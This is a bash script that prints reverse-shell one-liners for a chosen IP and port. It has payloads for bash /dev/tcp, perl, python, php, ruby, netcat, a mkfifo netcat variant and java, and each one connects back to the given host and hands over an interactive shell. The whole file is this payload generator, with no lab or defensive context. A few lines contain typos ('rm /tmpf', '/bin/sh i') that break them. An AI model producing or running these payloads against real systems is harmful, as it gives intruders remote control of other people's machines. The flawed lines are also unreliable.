#!/usr/bin/env bash

usage()
{
	echo -e "usage: $0 -s <Shell> -i <IP Address> -p <Port>\n"
       	echo -e "-i\tIP Address"
	echo -e "\t\tex. 192.168.0.10"
	echo -e "-p\tPort number"
	echo -e "\t\tex. 9001"
	echo -e "-s\tShell type"
	echo -e "\t\tbash"
	echo -e "\t\tperl"
	echo -e "\t\tpython"
	echo -e "\t\tphp"
	echo -e "\t\truby"
	echo -e "\t\tnetcat | nc"
	echo -e "\t\tnetcat-old | nc-old (eg. without -e option)"
	echo -e "\t\tjava"
	echo -e "-h\tPrint usage message\n"
}

bash_shell()
{
	echo -e "bash -i >& /dev/tcp/"$ip"/"$port" 0>&1"
}

perl_shell()
{
	echo -e "perl -e 'use Socket;\$i="\"$ip\"";\$p="$port";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
}

python_shell()
{
	echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\"$ip\"","$port"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
}

php_shell()
{
	echo -e "php -r '\$sock=fsockopen("\"$ip\"","$port");exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
}

ruby_shell()
{
	echo -e "ruby -rsocket -e'f=TCPSocket.open("\"$ip\"","$port").to_i;exec sprintf(\"/bin/sh i <&%d >&%d 2>&%d\",f,f,f)'"
}

nc_shell()
{
	echo -e "nc -e /bin/sh $ip $port"
}

oldnc_shell()
{
	echo -e "rm /tmpf;mkfifo /tmpf;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
}

java_shell()
{
	echo -e "r = Runtime.getRuntime()"
	echo -e "p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/$ip/$port;cat <&5 | while read line; do \$line 2>&5 >&5; done\"] as String[])"
	echo -e "p.waitFor()"
}

while getopts "i:p:s:h" argument; do
case "${argument}" in
	i)
		ip=${OPTARG}
		;;
	p)
		port=${OPTARG}
		;;
	s)
		shell=${OPTARG}
		;;
	h)
		usage
		exit
		;;
esac
done

if [ $shell = "bash" ]
then
	bash_shell
elif [ $shell = "perl" ]
then
	perl_shell
elif [ $shell = "python" ]
then
	python_shell
elif [ $shell = "php" ]
then
	php_shell
elif [ $shell = "ruby" ]
then
	ruby_shell
elif [ $shell = "netcat" -o $shell = "nc" ]
then
	nc_shell
elif [ $shell = "netcat-old" -o $shell = "nc-old" ]
then
	oldnc_shell
elif [ $shell = "java" ]
then
	java_shell
else
	echo ERROR: invalid options 1>&2
	usage
	exit 1
fi
